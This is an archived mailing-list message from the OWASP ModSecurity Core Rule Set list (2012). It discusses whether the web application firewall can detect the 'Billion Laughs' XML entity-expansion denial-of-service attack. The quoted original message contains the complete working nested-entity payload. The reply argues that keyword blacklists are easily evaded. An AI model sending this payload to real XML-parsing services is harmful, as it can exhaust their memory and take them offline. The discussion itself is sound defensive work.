<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] Is modsecurity vulnerable to this XML DoS attack
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Is%20modsecurity%20vulnerable%20to%0A%20this%20XML%20DoS%20attack&In-Reply-To=%3C5083148C.7060806%40sic-sec.org%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001229.html">
   <LINK REL="Next"  HREF="001231.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] Is modsecurity vulnerable to this XML DoS attack</H1>
    <B>Achim</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Is%20modsecurity%20vulnerable%20to%0A%20this%20XML%20DoS%20attack&In-Reply-To=%3C5083148C.7060806%40sic-sec.org%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] Is modsecurity vulnerable to this XML DoS attack">owasp at sic-sec.org
       </A><BR>
    <I>Sat Oct 20 21:15:56 UTC 2012</I>
    <P><UL>
        <LI>Previous message: <A HREF="001229.html">[Owasp-modsecurity-core-rule-set] Is modsecurity vulnerable to this	XML DoS attack
</A></li>
        <LI>Next message: <A HREF="001231.html">[Owasp-modsecurity-core-rule-set] encoding
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1230">[ date ]</a>
              <a href="thread.html#1230">[ thread ]</a>
              <a href="subject.html#1230">[ subject ]</a>
              <a href="author.html#1230">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>hmm, what should modsec do here?
Using a blacklist for lol, then the attacker replaces lol by lulz ;-)

This is completely valid XML syntax. I guess it is not simply detectable as
attack, just think about this example:

&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt;
 &lt;!ENTITY lol1 &quot;&lol;&quot;&gt;
 &lt;!ENTITY lol2 &quot;&lol;&quot;&gt;
 &lt;!ENTITY lol3 &quot;&amp;lol1;&amp;lol2;&quot;&gt;
 &lt;!ENTITY lol4 &quot;&amp;lol2;&amp;lol3;&quot;&gt;
....
]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;

You need a sophisticated XML-parser for that.

If an application is that stupid that it accepts such user suplied XML, you
better disconnect it from network rather than trying to hot patch it, IMHO.

Just my 2 pence,
Achim

Am 20.10.2012 22:42, schrieb Tzury Bar Yochay:
&gt;<i> Hi,
</I>&gt;<i> 
</I>&gt;<i> I just came across this Wikipedia article called Billion Laughs
</I>&gt;<i> <A HREF="http://en.wikipedia.org/wiki/Billion_laughs">http://en.wikipedia.org/wiki/Billion_laughs</A> and wonder if anyone ever
</I>&gt;<i> tested modsec XML parsing against that one
</I>&gt;<i> 
</I>&gt;<i> The vector is
</I>&gt;<i> 
</I>&gt;<i> &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol1 &quot;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
</I>&gt;<i>  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
</I>&gt;<i> ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</I></PRE>



<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001229.html">[Owasp-modsecurity-core-rule-set] Is modsecurity vulnerable to this	XML DoS attack
</A></li>
	<LI>Next message: <A HREF="001231.html">[Owasp-modsecurity-core-rule-set] encoding
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1230">[ date ]</a>
              <a href="thread.html#1230">[ thread ]</a>
              <a href="subject.html#1230">[ subject ]</a>
              <a href="author.html#1230">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
